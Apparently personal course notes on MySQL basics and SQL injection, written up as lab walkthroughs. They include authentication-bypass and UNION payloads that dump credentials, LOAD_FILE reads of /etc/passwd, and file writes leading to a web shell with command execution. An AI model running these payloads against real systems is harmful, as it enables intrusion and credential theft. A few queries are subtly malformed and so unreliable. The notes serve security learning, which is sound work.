
## Introduction 

most modern web apps use a database to store and retrieve data related to the web app   
stores web content, user info, etc. 

web app needs to interact with the db in real-time   
as HTTP requests arrive from the user the web app backend will issue queries to the db to build the response   
queries can include info from the request or other relevant info 

![](Images/Pasted%20image%2020240125103221.png)

when user-supplied info is used to create the query to the db, the user can use malicious input to have access to the query db through SQLi 

this module focuses on relational SQLi against MySQL but there are also attacks against non-relational db called NoSQLi 

### SQL injection 

many types of injection attacks like HTTP injection, code injection, and command injection   
sql injection is the most common example 

many ways to accomplish  
to get a sql injection to work the attacker needs to inject SQL code to change the original query that the web app wants to make   
typically completed by adding a `'` or `"`

once attacker can inject they look for a way to execute a different sql query   
could be done by using SQL to make up a working query that executes the intended and malicious queries   
different ways to do this like stacked or union queries 

to retrieve our new query's output we need to interpret it or capture it on the frontend 

### Use cases and impact 

sqli can cause lots of damage because attackers can gain access to secret info, user logins, and credit card info

another use case is to subvert intended web app logic like bypassing login without username and password or accessing hidden features 

attackers may also be able to read and write files directly on the back-end server 

## Intro to Databases 

### Database management systems

DBMS helps create, define, host, and manage databases   
many different kinds like file-based, relational, NoSQL, graph based, and key/value stores   
can also interact with DBMS in different ways like cli, gui, or apis 

essential features of DBMS: 
- concurrency - makes sure that concurrent actions of people using it at the same time succeed without corrupting or losing data 
- consistency - makes sure that data remains consistent and valid throughout the db 
- security - security controls through user auth and permissions 
- reliability - easy to backup databases and roll them back to previous states 
- SQL - simplify user interaction with the database through an intuitive syntax

two tiered structure:

![](Images/Pasted%20image%2020240125153152.png)

tier 1 = client-side apps like websites or gui programs; data from these are passed to tier 2 through API calls or othe requests   
tier 2 = middleware; interprets events and puts them in a form that is understandable by the DBMS

possible to host the app server and the DBMS on the same host, but DBMS with lots of data are typically separated 

## Types of Databases 

### Relational databases

most common type of db   
uses a schema to dictate the data structure stored in the database, like a template 

tables in relational db are associated with keys that provide a quick db summary or access to a specific row or column 

when processing an integrated db a concept is required to link one table to another using its key   
this is relational database management system (RDBMS)   

can link tables together without storing all of each other's data   
each table can have more than one key  

relationship between tables in a db is called a schema 

### Non-relational databases

NoSQL db don't use tables, rows, columns, prime keys, relationships, or schemas   
instead uses various different storage models depending on types of data  
very flexible and scalable; good for data with not well defined structure 

four common storage models: 
- key-value 
- document-based
- wide-column
- graph

## Intro to MySQL 

### SQL 

sql syntax can differ from different RDMBSs but they are all required to follow the ISO standard SQL language 

sql can be used to perform: 
- retrieve data
- update data
- delete data 
- create new tables and databases
- add / remove uses 
- assign permissions to users 

### Command line 

`mysql` utility is used to interact with a MySQL or MariaDB database 

`-u` for username and `-p` for password, but `-p` should be passed empty so we are prompted to enter the password instead of passing through command 

can specify a host with `-h` and port with `-P`

`mysql -u root -h 94.237.54.37 -P 45843 -p`

the default mysql or mariadb port is 3306  

### Creating a database 

now that we are connected to the sql server we can create a database with `CREATE DATABASE`: 

![](Images/Pasted%20image%2020240125171844.png)

we can then view the list of databases with `SHOW DATABASES`: 

![](Images/Pasted%20image%2020240125171939.png)

then we can switch to the newly created users database with `USE`: 

![](Images/Pasted%20image%2020240125172008.png)

sql statements aren't case sensitive but database names are 

### Tables

rows, columns, and cells

every table is created with a fix set of columns where each one is a certain data type  

we can create a new table and specify the columns: 

```
CREATE TABLE logins (
	id INT,
	username VARCHAR(100),
	password VARCHAR(100),
	date_of_joining DATETIME
)
```

![](Images/Pasted%20image%2020240125173016.png)

this will create a table named logins with four columns: 
- id = integer
- username = 100 char string
- password = 100 char string
- date_of_joining = DATETIME 

can then use `SHOW TABLES` to view the table and `DESCRIBE` to list the table structure with its fields and data types: 

![](Images/Pasted%20image%2020240125173246.png)

![](Images/Pasted%20image%2020240125173259.png)

### Table properties 

in `CREATE TABLE` there are many properties that can be set for the table and each column 

we can set the id column to auto-increment using `AUTO-INCREMENT`: 

`id INT NOT NULL AUTO_INCREMENT,`

`NOT NULL` ensures that a column is never empty 

we can also use `UNIQUE` to ensure that each item is unique: 

`username VARCHAR(100) UNIQUE NOT NULL,`

`DEFAULT` can be used to specify a default value, for example we can use `NOW()` to set a default DATETIME: 

`date_of_joining DATETIME DEFAULT NOW()`

`PRIMARY KEY` can be used to uniquely identify each record in the table: 

`PRIMARY KEY (id)`

the final CREATE TABLE would look like: 

```sql
CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
    );
```


## SQL Statements 

### INSERT statement 

insert is used to add new records to a table: 

`INSERT INTO table_name VALUES (col1_value, col2_value, col3_value, ...)`

![](Images/Pasted%20image%2020240126124030.png)

the above example can be modified to skip columns with default values by specifying the columns names to insert into: 

`INSERT INTO table_name(col1, col3, ...) VALUES (col2_value, col3_value, ...);`

skipping columns with `NOT NULL` specified will result in error 

![](Images/Pasted%20image%2020240126124525.png)

can also insert multiple records at once with commas: 

`INSERT INTO logins(username, password) VALUES ('john', 'john123'), ('tom', 'tom123');`

### SELECT statement 

mostly used to retrieve data but has other purposes 

general syntax: 

`SELECT * FROM table_name;`

`*` = wildcard to select all columns 

`FROM` = selects the table to get from 

also possible to view data from specific columns: 

`SELECT col1, col2 FROM table_name;`

![](Images/Pasted%20image%2020240126125454.png)

### DROP statement 

used to remove tables and databases from the server 

`DROP TABLE logins;`

![](Images/Pasted%20image%2020240126125756.png)

note that DROP will permanently and completely delete a table with no confirmation 

### ALTER statement 

can be used to change the name of any table and any of its fields, or to delete or add a new column to an existing table 

here we add a new column using `ADD`: 

`ALTER TABLE logins ADD newColumn INT;`

![](Images/Pasted%20image%2020240126130347.png)

we can rename a column using `RENAME COLUMN` and `TO`: 

`ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn`

![](Images/Pasted%20image%2020240126130608.png)

can change a column's datatype with `MODIFY`: 

`ALTER TABLE logins MODIFY oldColumn DATE;`

![](Images/Pasted%20image%2020240126130819.png)

we can drop a column with `DROP`: 

`ALTER TABLE logins DROP oldColumn;`

![](Images/Pasted%20image%2020240126130947.png)

### UPDATE statement 

while `ALTER` can be used to change a table's properties, `UPDATE` can be used to update records within a table 

general syntax: 

`UPDATE table_name SET col1=newValue1, col2=newValue2, ... WHERE <condition>'`

![](Images/Pasted%20image%2020240126131309.png)

## Query Results 

### Sorting results 

we can sort the results of a query using `ORDER BY` and specifying the column: 

`SELECT * FROM logins ORDER BY password;`

![](Images/Pasted%20image%2020240126132106.png)

the sorting is done in ascending order by default, but we can specify with `ASC` or `DESC`: 

`SELECT * FROM logins ORDER BY password DESC;`

also possible to sort by multiple columns so that if there are duplicate values in the first column it will sort by the next: 

`SELECT * FROM logins ORDER BY password DESC, id ASC;`

### LIMIT results 

we can use `LIMIT` to show a specific number of results in case a query will return a large amount: 

`SELECT * FROM logins LIMIT 2;`

![](Images/Pasted%20image%2020240126132553.png)

we can also specify an offset before the `LIMIT` count to start at the specified row number: 

`SELECT * FROM logins LIMIT 1, 2;`

the offset marks the order of the first record to be **included**, starting from 0 (the first record in table)  
for the above query it will start and include at the second record and return 2 values in total 

![](Images/Pasted%20image%2020240126133232.png)

### WHERE clause 

can use `WHERE` to search for specific data: 

`SELECT * FROM table_name WHERE <condition>;`

we can get all rows and columns where the id is greater than 1: 

`SELECT * FROM logins WHERE id > 1;`

![](Images/Pasted%20image%2020240126133451.png)

can also be more specific and grab a certain row: 

`SELECT * FROM logins where username = 'admin'`

![](Images/Pasted%20image%2020240126133825.png)

Note that string and date data types need to be surrounded by quotes, but numbers can be used directly 

### LIKE clause 

`LIKE` can be used to select record by matching a certain pattern 

we can retrieve all records with usernames starting with "admin": 

`SELECT * FROM logins WHERE username LIKE 'admin%';`

![](Images/Pasted%20image%2020240126134533.png)

the `%` will act as a wildcard that matches all characters after "admin", used to match 0 or more characters   
`_` can be used to match exactly one character

`SELECT * FROM logins WHERE username LIKE '___'` will match all usernames with exactly 3 characters in them 

## SQL Operators 

SQL supports logical operators to use multiple conditions at once  
most common are `AND`, `OR`, and `NOT`

### AND operator 

takes two conditions and returns true or false based on both being satisfied 

![](Images/Pasted%20image%2020240126140312.png)

in SQL, any non-zero value is considered true, and usually returns 1 to signify true   
0 is considered false 

### OR operator 

returns true when one of the conditions evaluates to true: 

![](Images/Pasted%20image%2020240126140541.png)

### NOT operator 

`NOT` will toggle a boolean value: 

![](Images/Pasted%20image%2020240126140641.png)

### Symbol Operators 

`AND`, `OR`, and `NOT` can also be represented as `&&`, `||`, and `!`: 

![](Images/Pasted%20image%2020240126140856.png)

### Operators in queries 

we can use `NOT` to get all queries where username is not "john": 

![](Images/Pasted%20image%2020240126141132.png)

![](Images/Pasted%20image%2020240126141142.png)

we can also select all users who have an id greater than 1 and username not equal to "john": 

![](Images/Pasted%20image%2020240126141248.png)

### Multiple operator precedence 

SQL also supports other operations like addition, division, and bitwise operations 

the order of these operations is decided by operator precedence, here are some common ones: 
- division, multiplication, and modulus
- addition and subtraction
- comparison 
- NOT
- AND 
- OR 

operators at the top are evaluated before ones at the bottom 

`SELECT * FROM logins WHERE username != 'tom' AND id > 3 - 2;`

in the above statement we can derive the order as: 
- 3 - 2 
- the comparison operators `>` and `!=` will be evaluated together 
- AND 

## Intro to SQL Injections 

### Use of SQL in web applications 

once a DBMS is installed and setup on a back-end server, the web apps can start utilizing it to store and retrieve data 

in PHP for example we can start using the mysql database: 

```php
$conn = new mysqli("localhost", "root", "password", "users");
$query = "select * from logins";
$result = $conn->query($query);
```

then we can print all the output: 

```php
while($row = $result->fetch_assoc()) {
	echo $row["name"]."<br>";
}
```

typically apps will use user input to craft the search: 

```php
$searchInput = $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```

### What is an injection

in the above example we use direct input with no sanitation to use as a SQL query   
injection occurs when an app misinterprets user input as actual code rather than a string, which results in the user input being executed as code 

### SQL injection

in the above example `searchInput` can include anything that the user provides, including malicious code 

typically payloads will use `'` or `"` to terminate the internal SQL statement and start a new one:

`%1'; DROP TABLE users;'`

so then the full statement that gets executed is: 

`select * from logins where username like '%1'; DROP TABLE users;'`

however, in the above example we added another sql statement after the semi colon but this isn't actually possible in MySQL   
possible in MSSQL and PostgreSQL 

### Syntax errors 

in the last statement there will be an error returned because of the trailing `'` 

when we inject sql we need to consider where our code will be relative to the rest of the statement since it could be at the end or in the middle  
one way to ensure that we avoid errors is by using comments to comment out any input that we don't need   
another way is to pass multiple single quotes 

### Types of SQL injections 

sql injections are categorized by how and where we retrieve their output 

![](Images/Pasted%20image%2020240128134233.png)

**in-band** = the output of the intended and the new query may be printed directly to the front end  
Union based and error based

in union based we might have to specify the exact location (or column) which we can read, so query will direct output to be printed there 

error based is when we can get the PHP or SQL errors in the frontend  
we intentionally cause an error that returns the output of our query 

**blind** = might not get the output printed so we use SQL logic to get the output character by character   
boolean based and time based 

boolean based we can use sql conditional statements to control whether the page returns output or not   

time based sql injections use conditional statements to delay the page response if it returns true 

**out-of-band** = might not have direct access to output at all so we have to direct output to a remote location like a DNS record and attempt to retrieve it there 

## Subverting Query Logic 

we first need to learn to modify the original query by injecting `OR` and using comments to subvert the original logic 

### Authentication bypass

our target is an admin panel: 

![](Images/Pasted%20image%2020240129110859.png)

when we login we can see the underlying SQL query to better understand what our input is doing: 

![](Images/Pasted%20image%2020240129110953.png)

our goal is to login without using the credentials

the page takes credentials and uses the `AND` operator to look for records with the given username and password 

### SQLi discovery 

to first see if our logic is vulnerable to injection we can try some basic payloads: 

- `'` = `%27`
- `"` = `%22`
- `#` = `%23`
- `;` = `%3B`
- `)` = `%29`

note that in some cases we may have to use the url encoded version, like if we want to inject directly into the URL 

if we use the `'` payload we get a SQL error: 

![](Images/Pasted%20image%2020240129111619.png)

we could do a couple of things with this: 
- comment out everything after the injected `'`
- use another `'` to even out the number of them 

### OR injection 

to bypass the authentication we need the query to always return true   
to do this we can use the `OR` operator 

for MySQL order of precedence, `AND` is evaluated before `OR`   
this means that if there is at least one true condition then the entire query will evaluate to true 

so now to keep an even number of quotes we can use the payload: 

`admin' or '1'='1`

![](Images/Pasted%20image%2020240129112214.png)

the above conditional logic is: 
- if the username is admin OR 
- if 1=1 return true AND 
- password is password 

![](Images/Pasted%20image%2020240129112354.png)

can find many other payloads like this on PayloadAllTheThings

### Auth bypass with OR operator 

the above example worked because we knew a valid username, however if we didn't know one we would need an overall true query  
this could be done by injecting an `OR` condition into the password field 

we can input two payloads into the form: 

`notadmin' OR '1'='1`

`something' OR '1'='1`

![](Images/Pasted%20image%2020240129113041.png)

this will result in the table returning everything from the table and logging in to the first user returned 

## Using Comments 

can use two types of line comments in MySQL: 
- `--`
- `#`

there is also inline comments with `/**/`, though not normally used in sql injections 

in SQL, using two dashes only is not enough for a comment, there has to be an empty space after them   
the payload needs to be `-- `, and url encoded it would be `--+` because `+` is used for spaces in urls 

if you are inputting your payload into the url, a `#` is usually considered as a tag and will not be passed as part of the url   
instead we would need to use `%23` 

### Auth bypass with comments 

using comments will work for our target admin panel: 

![](Images/Pasted%20image%2020240129114321.png)

everything past the `username='admin'` will not be executed, therefore it only checks for rows where the username is admin 

### Another example 

![](Images/Pasted%20image%2020240129114517.png)

in the above query, parenthesis are used to ensure that the username is admin and that the id is greater than 1, which prevents anyone from logging in as admin   
we can also see that the password was hashed before being used, this will prevent us from injecting through the password field because the input will be converted to a hash 

when we login with valid credentials: 

![](Images/Pasted%20image%2020240129114712.png)

this will not work because the admin account's id is equal to 1, and not greater than 

if we try to login with another user like tom: 

![](Images/Pasted%20image%2020240129114817.png)

we successfully login because the tom user's id is greater than 1 

if we try `admin'-- `:

![](Images/Pasted%20image%2020240129114931.png)

this will fail because we did not close the parenthesis  
our new payload needs to be: 

`admin')-- `

## Union Clause 

so far we have only been manipulating the original query  
now we will use another type of injection that will inject entire SQL queries executed alongside the original query   

### Union 

the union clause is used to combine results from multiple `SELECT` statements   
through a `UNION` injection we can `SELECT` and dump data from all across the DBMS, meaning multiple tables and databases  

we can combine `SELECT` statements like: 

`SELECT * FROM ports UNION SELECT * FROM ships;`

note that the data types of all the selected columns on all positions need to be the same 

### Even columns

a `UNION` statement can only operate on `SELECT` statements with equal number of columns 

if the query is: 

`SELECT * FROM products WHERE product_id = 'user_input'`

we can inject a `UNION` query into that input so that rows from another table are returned: 

`SELECT * FROM products WHERE product_id = '1' UNION SELECT username, password FROM passwords-- `

assuming the products table has 2 columns, the query would return usernames and passwords from the passwords table 

### Un-even columns

usually won't have the same number of columns as the SQL query we want to execute   

if we only had one column, we can put junk data for the remaining required columns so that the columns we are UNIONing remains the same as the original query 

we can use any string as our junk data and the query will return the string as its output for that column: 

`SELECT "junk" from passwords` 

`SELECT 1 from passwords`

we only need to make sure that the data type matches the data type of the column  
for more advanced SQL injections we might want to use `NULL` because this will fit any data type 

if we wanted to only get the username column from the products table, which has 2 columns, we could do: 

`SELECT * FROM products WHERE product_id = '1' UNION SELECT username, 2 FROM passwords`

## Union Injection 

in our target page we can see that our payloads will result in an error: 

![](Images/Pasted%20image%2020240129122527.png)

### Detect number of columns 

there are two methods to detect the number of columns: 
- `ORDER BY`
- `UNION`

### Using ORDER BY 

we want to inject a query that sorts the results by a column we specified like column 1, column 2, ... until we get an error that the column specified does not exist

we can start with `ORDER BY 1` to sort by the first column, then continue with `ORDER BY 2` and so on until we get the number of columns that doesn't exist 

using `' ORDER BY 1-- ` we get results: 

![](Images/Pasted%20image%2020240129122927.png)

by continuing to do the same we can see that doing `ORDER BY 5` will not work, meaning that the table has 4 columns

### Using UNION

another method is to attempt `UNION` injections with different numbers of columns until we successfully get results back 

can start with a 3 column query: 

`' UNION SELECT 1, 2, 3-- `

and continue to modify the number of columns selected until we get results 

### Location of injection 

while a query may return multiple columns, the frontend app may only display some of them  
if we inject our query in a column that is not printed to the page, then we will not get its output   
we need to determine which columns are printed to the page to determine where our injection needs to go 

from our injection of `cn' UNION SELECT 1,2,3,4-- ` we can see that the first column is not printed: 

![](Images/Pasted%20image%2020240129123743.png)

therefore, we can't put our injection at the beginning 

to test if we can get actual data from the database rather than just numbers, we can use `@@version` sql query in place of the second column: 

`cn' UNION SELECT 1,@@version,3,4-- `

![](Images/Pasted%20image%2020240129123901.png)

now we know that we can do other things like: 

`cn' UNION SELECT 1,user(),3,4-- `

![](Images/Pasted%20image%2020240129124034.png)

## Database Enumeration 

### MySQL fingerprinting 

before we enumerate the database we need to know what kind of DBMS we are using so that we know what kinds of queries we can run 

some initial guesses we can do are: 
- apache and nginx = linux = mysql 
- IIS = mssql

these queries can tell us that we are working with MySQL: 
- `SELECT @@version` - when we have full query output - MySQL and MSSQL will return version, error on other
- `SELECT POW(1,1)` - when we only have numeric output - MySQL returns 1, error on other
- `SELECT SLEEP(5)` - blind or no output - delays page response for 5 seconds and returns 0, will not delay on other 

### INFORMATION_SCHEMA database 

to pull info from the databases we need some info: 
- list of dbs 
- list of tables in each db
- list of columns in each table 

the INFORMATION_SCHEMA database has metadata about the db and tables   
this is a special db that we can't call its tables directly with a `SELECT` statement  

to reference a table in another DB we can use `.`: 

`SELECT * FROM my_database.users;`

### SCHEMATA 

the table `SCHEMATA` in the `INFORMATION_SCHEMA` database has info about all databases on the server   
used to obtain db names so we can query them 

the `SCHEMA_NAME` column contains all the db names currently present 

`SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;`

note that the first 3 results from this query will show the default MySQL databases present on any server   
sometimes there is a fourth 'sys' db as well 

so now we can try payloads like: 

`cn' UNION SELECT 1,schema_name,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- `

![](Images/Pasted%20image%2020240129160558.png)

apart from the default databases we can see "dev" and "ilfreight"

now we can try to find out which database the web app is using to retrieve the ports data from   
we can get the current database with `SELECT database()`: 

`cn' UNION SELECT 1,database(),2,3-- `

![](Images/Pasted%20image%2020240129160810.png)

### TABLES 

before we dump data from the dev database we need a list of tables to query  
to find all the tables within a database we can use the `TABLES` table in the `INFORMATION_SCHEMA` database

`TABLES` contains info about all tables throughout the database   
we are interested in the `TABLE_SCHEMA` column for each database the table belongs to and `TABLE_NAME` for all table names

`cn' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4 FROM INFORMATION_SCHEMA WHERE table_schema='dev'-- `

![](Images/Pasted%20image%2020240129161417.png)

with the specified `table_schema='dev'` we can return only tables that exist in the dev database 

### COLUMNS

now we can start dumping data for the found tables  
the `COLUMNS` table in the `INFORMATION_SCHEMA` database contains info about all columns present in all the databases 

the columns we are interested in are `COLUMN_NAME`, `TABLE_NAME`, and `TABLE_SCHEMA` 

`cn' UNION SELECT 1,COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='credentials'-- `

![](Images/Pasted%20image%2020240129162551.png)

### Data

now we have all the info we need to dump data from the credentials table in the dev database: 

`cn' UNION SELECT 1, username, password, 4 FROM dev.credentials-- `

![](Images/Pasted%20image%2020240129162728.png)

## Reading Files

sql injections can also be used to read and write files on the server and gain RCE on the backend server 

### Privileges

reading is much more common than writing, which is strictly reserved for privileged users in modern DBMSs 

in MySQL the db user must have the `FILE` privilege to load a file's content into a table, then dump that data to read it 

### DB user 

first we need to determine which user we are in the database   
we don't always need DBA privileges to read data, but it is becoming more common to need them 

we can use these queries to find our current DB user: 
- `SELECT USER()` 
- `SELECT CURRENT_USER()` 
- `SELECT user from mysql.user`

our UNION payload will be: 

`cn' UNION SELECT 1,user(), 3, 4-- `

or: 

`cn' UNION SELECT 1, user, 3, 4 FROM mysql.user-- `

![](Images/Pasted%20image%2020240129183508.png)

### User privileges

we can first check if we have super admin privileges with: 

`SELECT super_priv FROM mysql.user`

`cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user`

if we have many users we can also add `WHERE user="user"`

![](Images/Pasted%20image%2020240129183725.png)

Y = YES showing that we do have super privileges 

we can also dump other privileges we have directly from the schema: 

`cn' UNION SELECT 1, grantee, privilege_type, 4 FROM INFORMATION_SCHEMA.USER_PRIVILEGES-- `

we could also add `WHERE grantee="'root'@'localhost'"`

![](Images/Pasted%20image%2020240129183910.png)

we can see that the `FILE` privilege is given to our user meaning that we can read files and potentially write them 

### LOAD_FILE

`LOAD_FILE()` is a function that can be used in MySQL or MariaDB that reads data from files   
takes in one argument that is the file name

`SELECT LOAD_FILE('/etc/passwd');`

we will only be able to read the file if the OS user running MySQL has privileges to read it 

our injection will become: 

`cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- `

![](Images/Pasted%20image%2020240129184613.png)

### Another example 

we can try to read the source code of the file that we are on with: 

`cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- `

![](Images/Pasted%20image%2020240129184752.png)

![](Images/Pasted%20image%2020240129184813.png)

## Writing Files 

modern DBMSs will disable file-write by default and require certain privileges for DBAs to write files 

### Write file privileges

to write files to the back-end server we require 3 things: 
- user with `FILE` privilege enabled
- MySQL global `secure_file_priv` variable not enabled 
- write access to the location we want to write to on the back-end server 

### secure_file_priv 

this variable is used to determine where to read/write files from   
an empty value lets us read files from the entire file system   
if a directory is specified then we can only read from the folder specified   
`NULL` means we can't read/write from any directory 

MariaDB has the variable set to empty by default, which lets us read/write to any file if the user has the `FILE` privilege  

MySQL uses `/var/lib/mysql-files` as the default folder, which means that reading files through MySQL injection isn't possible with default settings   
some configs even default to `NULL` 

we can obtain the value of `secure_file_priv` with: 

`SHOW VARIABLES LIKE 'secure_file_priv';`

if we are using a `UNION` statement then we will need a `SELECT` statement   
MySQL global variables are stored in a table called `global_variables` that has two columns `variable_name` and `variable_value` 

our query would be: 

`SELECT variable_name, variable_value FROM INFORMATION_SCHEMA.GLOBAL_VARIABLES WHERE variable_name="secure_file_priv"`

`cn' UNION SELECT 1, variable_name, variable_value, 4 FROM INFORMATION_SCHEMA.GLOBAL_VARIABLES WHERE variable_name="secure_file_priv"`

![](Images/Pasted%20image%2020240129194553.png)

if the value is empty, then we have read/write permissions to any location 

### SELECT INTO OUTFILE

`SELECT INTO OUTFILE` can be used to write data from select queries into files 

`SELECT * FROM users INTO OUTFILE '/tmp/credentials';`

it is possible to directly `SELECT` strings into files, which lets us write arbitrary files to the back-end server: 

`SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';`

the string "this is a test" will be written to the newly created test.txt file  
note that the new file will be owned by the mysql user

note that advanced file exports use `FROM_BASE64("base64_data")` to write long/advanced files, including binary data

### Writing files through SQL injection 

`SELECT 'file written successfully' INTO OUTFILE '/var/www/html/proof.txt'`

to write a web shell, we will need to know the base web directory for the web server   
one way to find this is to use `LOAD_FILE()` to read the server configuration 

apache config = `/etc/apache2/apache2.conf`  
nginx config = `/etc/nginx/nginx.conf`  
IIS config = `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`  

we could also try to run a fuzzing scan to write files to different possible web roots using: 
- `/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt`
-  `/SecLists/Discovery/Web-Content/default-web-root-directory-windows.txt`

if none of the above works we can use server errors to try to find the web directory that way 

a sample `UNION` payload would be: 

`cn' UNION SELECT 1, 'file written successfully!', 3, 4 INTO OUTFILE '/var/www/html/proof.txt'-- `

![](Images/Pasted%20image%2020240129200541.png)

if we see no errors then our query succeeded and we can open the file: 

![](Images/Pasted%20image%2020240129200646.png)

note that if we want to make the output cleaner and only output the file contents we can use `""` instead of 1, 3, 4 when grabbing columns

### Writing a web shell

we can use this php web shell to be able to execute commands on the back-end server: 

![](Images/Pasted%20image%2020240129201944.png)

so our `UNION` query will look like: 

![](Images/Pasted%20image%2020240129202006.png)

we can then execute our commands by inserting them into the `0`  parameter in our url: 

`http://SERVER_IP:PORT/shell.php?0=ls`

![](Images/Pasted%20image%2020240129202831.png)

